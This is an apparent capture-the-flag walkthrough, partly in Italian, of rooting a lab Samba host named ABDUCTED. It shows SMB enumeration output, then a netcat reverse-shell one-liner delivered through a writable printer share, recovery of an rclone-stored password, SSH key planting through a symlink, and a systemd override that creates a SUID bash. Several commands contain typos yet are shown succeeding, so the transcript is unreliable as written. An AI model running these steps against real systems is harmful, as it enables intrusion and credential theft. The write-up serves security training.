# Enumeration Enum4linux -a

```bash
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Sep 18 17:32:39 2026

[34m =========================================( [0m[32mTarget Information[0m[34m )=========================================

[0mTarget ........... 10.129.244.177
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


[34m ===========================( [0m[32mEnumerating Workgroup/Domain on 10.129.244.177[0m[34m )===========================

[0m[33m
[+] [0m[32mGot domain/workgroup name: WORKGROUP

[0m
[34m ==================================( [0m[32mSession Check on 10.129.244.177[0m[34m )==================================

[0m[33m
[+] [0m[32mServer 10.129.244.177 allows sessions using username '', password ''

[0m
[34m ===============================( [0m[32mGetting domain SID for 10.129.244.177[0m[34m )===============================

[0mDomain Name: WORKGROUP
Domain Sid: (NULL SID)
[33m
[+] [0m[32mCan't determine if host is part of domain or part of a workgroup

[0menum4linux complete on Fri Sep 18 17:32:43 2026

```

```bash
+ Enumerating users using SID S-1-22-1 and logon username , password 

+ S-1-22-1-1000 Unix User\scott (Local User)
+ S-1-22-1-1001 Unix User\marcus (Local User)
```

# Enumerazione con netexec,vediamo cosa troviamo

```bash
nxc smb 10.129.244.177 -u  -p  --rid-brute
SMB         10.129.244.177  445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.177  445    ABDUCTED         [+] ABDUCTED\: 
SMB         10.129.244.177  445    ABDUCTED         [-] RPC lookup failed: RPC method not implemented

nxc smb 10.129.244.177 -u  -p  --shares nxc smb 10.129.244.177 -u  -p  --shares

SMB         10.129.244.177  445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.177  445    ABDUCTED         [+] ABDUCTED\: 
SMB         10.129.244.177  445    ABDUCTED         [*] Enumerated shares
SMB         10.129.244.177  445    ABDUCTED         Share           Permissions     Remark
SMB         10.129.244.177  445    ABDUCTED         -----           -----------     ------
SMB         10.129.244.177  445    ABDUCTED         HP-Reception    WRITE           Reception printer
SMB         10.129.244.177  445    ABDUCTED         projects                        Hartley Group Project Files
SMB         10.129.244.177  445    ABDUCTED         transfer                        Staff file transfer
SMB         10.129.244.177  445    ABDUCTED         IPC$                            IPC Service (Hartley Group Document Services)
```

# Accesso al sistema #

+ Dopo una lunga ricerca dei servizi e vari test, o trovato una CVE adatta al nostro caso,bug trovato nel processo samba smbd
+ CVE-2026-4480. Bene Sfruttiamo la vulnerabilita trovata direttamente con il comando smbclient.
+ echo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.X.X 4444 >/tmp/f > esegui.txt

```bash
echo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.X.X 4444 >/tmp/f > esegui.txt

parrot@parrot:# nc -lvnp 4444

smbclient //10.129.244.177/HP-Reception -N -c "put esegui.txt |sh"

whoami 
nobody
```

# Privilege Escalation and lateral movement

```bash
find / -name "*scott*" -o -name "*rclone*" -o -name "*backup*" 2>/dev/null
nobody@abducted:/$ cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
---------------------------------------------

wich rclone
 /usr/bin/rclone
-----------------------------------------------------
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
---------------------------------------------------
su scott + pswwd: iXzvcib3SrpZ

whoami
scott
---------------------------------------------------
```

# Creation ssh key file

```bash
  
  ssh-keygen -q -t ed25519 -N '' -f /tmp/f
  
  ln -s /hom/marcus /srv/transfer/hm
  
  smbclient //127.0.0.1/transfer  - U 'scott%iXzvcib3SrpZ'  -c 'mkdir hm/.ssh; put  /tmp/f.pub hm/.ssh/authorized_keys'
  
  ssh -i /tmp/f marcus@127.0.0.1

  whoami
  marcus

  for action in $(pkaction);do pkcheck --action-id "$atcion" --process $$ > /dev/null 2>&1 && echo "allowed-> $action";done
  allow org.freedesktop.login1.inhibit-block-idle
  allow org.freedesktop.login1.inhibit-delay-shutdown
  allow org.freedesktop.login1.inhibit-delay-sleep
  allow org.freedesktop.login1.set-self-linger
  allow org.freedesktop.systemd1.reload-daemon
  
cd /etc/systemd/system/smbd.service.d/

touch override.conf

echo '[Service]
ExecStertPre=/bin/cp /bin/bash /tmp/.rbash
ExecStratPre=/bin/chmod 04755 /tmp/.rbash' >> override.conf

systemctl daemon-reload
systemctl restart smbd

/tmp/.rbhash -p
whoami
root
```
